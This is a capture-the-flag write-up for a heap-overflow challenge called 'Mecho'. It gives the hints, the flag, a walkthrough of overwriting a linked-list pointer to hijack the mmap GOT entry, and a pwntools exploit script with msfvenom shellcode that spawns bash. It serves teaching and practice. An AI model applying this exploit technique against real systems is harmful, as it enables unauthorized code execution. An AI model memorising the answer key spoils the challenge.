

# Challenge Name

Mecho

# Point Value and Assessed Difficulty

​
200  
Medium


# Category

Network Exploitation


# Challenge Prompt/Question


Mecho is better than echo! Now everyone gets the  entire echo history, but it keeps getting too long!



* [binary](mecho)


# Hints


If the challenge is too difficult any of these hints should help the challengers and can be released depending on where they are during their exploit development or where they are stuck.

* __Hint 1:__ *(heap)* Allocation of input is the key!
* __Hint 2:__ *(struct)* How is the history feature built?
* __Hint 3:__ *(extreme hint)* The concept from use-on-free() linking and unlinking type of exploitations can also work for other types of linked lists.  ([Ferguson](https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf))


# Key


flag{Wh@m_8AM_7hank_y0u_mM@p_m3(ho$}


# Walkthrough

This challenge requires some knowledge of heap overflows and abusing linked lists. To solve this challenge with the author's proof of exploit an attacker would need to understand how to take advantage of the unlink and link functionality to over-write an entry in the Global Offset Table ([GOT](http://bottomupcs.sourceforge.net/csbu/x3824.htm)) similar to a use-on-free() exploit. [\[1\]](#endnote1)


## Concept Development

The goal behind developing this challenge was to provide a heap based vulnerability that doesn't necessarily rely on ```free()``` in order to write arbitrary data. If an attacker understands how to exploit a ```free()``` vulnerability they should also be able to take advantage of an error in the logic of a linked list as well.


## Discovery

First, let's examine the security features of this program. With [checksec](http://www.trapkit.de/tools/checksec.html) we can see that the binary only has protections from stack execution. This hints to us that we will either need to use something that is already executable (libc for example), use return-oriented-programming, or find some other way to gain execution.

> CANARY    : disabled <p>
FORTIFY   : disabled <p>
**NX        : ENABLED** <p>
PIE       : disabled <p>
RELRO     : disabled

Next, let's examine the binary using ```file```. Here we find that we are dealing with a 64-bit executable and left the symbols intact. How lucky for us!

>mecho: **ELF 64-bit LSB executable, x86-64**, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e91255f29282c131e3f9c914f3ff22d2e06a0258, **not stripped**

The binary is fairly straight-forward. It will read input using ```fgets()``` in a loop. It has two shown options ```!e and !d``` which allow you to exit and delete, respectively, plus was that is hidden ```!\x05``` which allows you to run a diagnostic message. Looking at ```fgets()``` we see that it will accept 0x110 (272) bytes of input from stdin. It will then span the string removing several characters ```0xa, 0xd, 0x9, 0xc, 0xb``` which can all be found under ```man ascii```. After that depending on the option it will either delete a node using ```munmap()``` or create a new node via ```mmap()```.

What happens to the input from ```fgets()```? The input gets placed inside the heap based on an address location chosen by ```mmap()```. Let's examine the heap. First, use ```pgrep mecho``` to find the running pid, then ```cd /proc/pid```, and examine maps. Now, we've discovered something very useful - a mapped area of memory with r/w/x permissions!

![Process-Map](images/proc_maps.png)

Now that we have a place that we can r/w/x, the next goal is to get to our data. When we examine the heap location allocated by ```mmap()```, we are able to see that our input has found its way into the r/w/x part of the heap. Now we have all the components needed in order to exploit this program. An area we can write to that is also executable. Next, comes the redirection of code execution so this area of memory.

![Heap-View](images/fgets_buff.png)


## Solution

In order to gain arbitrary code execution the attacker needs to overflow the buffer used by ```fgets()```. The reason it can be overflowed is because the developer used the sizeof a struct (272 bytes) versus the size of the buffer (255 bytes) to bound the ```fgets()``` function. This allows us to overflow the bytes following the buffer which are used to change a pointer assignment from the next node to a location of our choosing (in this selection I choose the mmap() entry in the PLT). When the pointer assignment is done, the location of our choosing will have the address of the heap instead of the address it previously had. At this point the program will run ```fgets()```, we provide executable shellcode, and then the next time ```mmap()``` is called - our shellcode runs instead of ```mmap()```.

![Code-Register-View](images/pointer_change.png)

The solution is automated in python and uses the [pwntools](http://pwntools.readthedocs.org/en/latest/intro.html) library for simplicity. Testing for a solution was done via attaching to a process in gdb as shown on lines 8-12. However, a remote exploit would work just as easily by changing the process in line 7 to a ```remote(ipAddr, port)``` combination. It's important to note that all address values passed to the vulnerable program must be 8 bytes in size and little endian in order to be interpreted properly by the program itself. I set about doing this in the easiest way - the p64() method from pwntools.

Line 14 is the address I derived from the binary for the Global Offset Table (GOT) [\[2\]](#endnote2) entry for ```mmap()```, which was overwritten with the address to the heap containing shellcode.

Lines 16-22 is the 44 byte payload created by [Metasploit](https://www.metasploit.com/) via ```msfvenom```. Shellcode can also be downloaded from [shell-storm](http://shell-storm.org/shellcode/) which is also used as a source for [PEDA GDB's](https://github.com/longld/peda) shellcode generator.

Lines 27-30 is the actual code that grants me remote execution by taking advantage of an unlink exploit in the binary to write the address of the r/w/x heap into the GOT table entry for mmap.

----

# Proof of Exploit/Solution

```python
#!/usr/bin/python

from pwn import *

context.log_level = 'info'

c = process('./mecho')
# gdb.attach(c, """
#               b main
#               b *0x400990
#               """)

#fgets_plt = p64(0x600f58-0x100)
mmap_plt = p64(0x600f58-0x100)

# msfvenom --payload linux/x64/exec CMD="bash" -f py
# Payload size: 44 bytes
buf =  ""
buf += "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"
buf += "\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"
buf += "\x52\xe8\x05\x00\x00\x00\x62\x61\x73\x68\x00\x56\x57"
buf += "\x48\x89\xe6\x0f\x05"


rax_plus_1 = "\x48\x83\xC0\x01"
c.send("A"*256)
c.send(str(mmap_plt))
c.sendline("B"*7+rax_plus_1*3+buf)
c.interactive()


```

----

# Endnotes

<a name="endnote1">[1]</a>: Use on ```free()``` is a fairly well known type of exploitation where an attacker takes advantages of how ```malloc()``` and ```free()``` link and unlink nodes in the heap. [Mathy Vanhoef](http://www.mathyvanhoef.com/2013/02/understanding-heap-exploiting-heap.html) and [Justin Ferguson](https://www.blackhat.com/presentations/bh-usa-07/Ferguson/Whitepaper/bh-usa-07-ferguson-WP.pdf) describe how this works. However, the unlink type of exploitation that occurs with ```free()``` can also apply to any linked list.

<a name="endnote2">[2]</a>: There are several ways to derive addresses of dynamically linked functions from libc. Examples include: ```objdump -R mecho```, ```readelf -r mecho```, and with ```elfsymbol``` while inside GDB with a PEDA extension installed. [Click here](https://github.com/longld/peda) for GDB PEDA.
